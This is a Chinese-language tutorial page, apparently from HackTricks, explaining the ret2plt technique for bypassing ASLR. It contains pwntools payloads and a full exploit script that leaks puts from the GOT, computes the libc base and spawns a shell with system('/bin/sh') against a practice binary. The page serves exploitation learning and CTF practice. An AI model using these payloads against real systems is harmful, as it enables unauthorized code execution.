# Ret2plt

## 基本信息

这种技术的目标是**从PLT中泄漏函数的地址**，以便绕过ASLR。这是因为，例如，如果你泄漏了libc中`puts`函数的地址，你就可以**计算出`libc`的基址**，并计算出访问其他函数如**`system`**的偏移量。

这可以通过`pwntools`的有效载荷来实现，例如（[**从这里**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got)）：
```python
# 32-bit ret2plt
payload = flat(
b'A' * padding,
elf.plt['puts'],
elf.symbols['main'],
elf.got['puts']
)

# 64-bit
payload = flat(
b'A' * padding,
POP_RDI,
elf.got['puts']
elf.plt['puts'],
elf.symbols['main']
)
```
注意如何使用 PLT 中 `puts` 的地址调用，该地址是位于 GOT（全局偏移表）中的 `puts` 地址。这是因为当 `puts` 打印 `puts` 的 GOT 条目时，该条目将包含内存中 `puts` 的确切地址。

还要注意在利用中使用了 `main` 的地址，因此当 `puts` 结束执行时，**二进制文件会再次调用 `main` 而不是退出**（因此泄漏的地址将继续有效）。

{% hint style="danger" %}
请注意，为了使此方法有效，**二进制文件不能使用 PIE 编译**，或者您必须**找到一个泄漏以绕过 PIE**，以便了解 PLT、GOT 和 main 的地址。否则，您需要首先绕过 PIE。
{% endhint %}

您可以在[**此处找到此绕过的完整示例**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/ret2plt-aslr-bypass)。这是该**示例**中的最终利用：
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvline()

payload = flat(
'A' * 32,
elf.plt['puts'],
elf.sym['main'],
elf.got['puts']
)

p.sendline(payload)

puts_leak = u32(p.recv(4))
p.recvlines(2)

libc.address = puts_leak - libc.sym['puts']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
libc.sym['exit'],
next(libc.search(b'/bin/sh\x00'))
)

p.sendline(payload)

p.interactive()
```
## 其他示例和参考资料

* [https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/csawquals17\_svc/index.html)
* 64位，启用ASLR但没有PIE，第一步是填充溢出直到canary的字节0x00，然后调用puts泄漏它。使用canary创建ROP小工具来调用puts以从GOT中泄漏puts的地址，然后调用一个ROP小工具来调用`system('/bin/sh')`。
* [https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html](https://guyinatuxedo.github.io/08-bof\_dynamic/fb19\_overfloat/index.html)
* 64位，启用ASLR，没有canary，在一个子函数中从main中发生堆栈溢出。ROP小工具调用puts以泄漏GOT中puts的地址，然后调用一个one gadget。

{% hint style="success" %}
学习并练习AWS黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks 培训 AWS 红队专家 (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
学习并练习GCP黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks 培训 GCP 红队专家 (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>支持 HackTricks</summary>

* 查看[**订阅计划**](https://github.com/sponsors/carlospolop)!
* **加入** 💬 [**Discord 群组**](https://discord.gg/hRep4RUj7f) 或 [**电报群组**](https://t.me/peass) 或 **关注**我们的 **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* 通过向[**HackTricks**](https://github.com/carlospolop/hacktricks)和[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 仓库提交 PR 来分享黑客技巧。

</details>
{% endhint %}
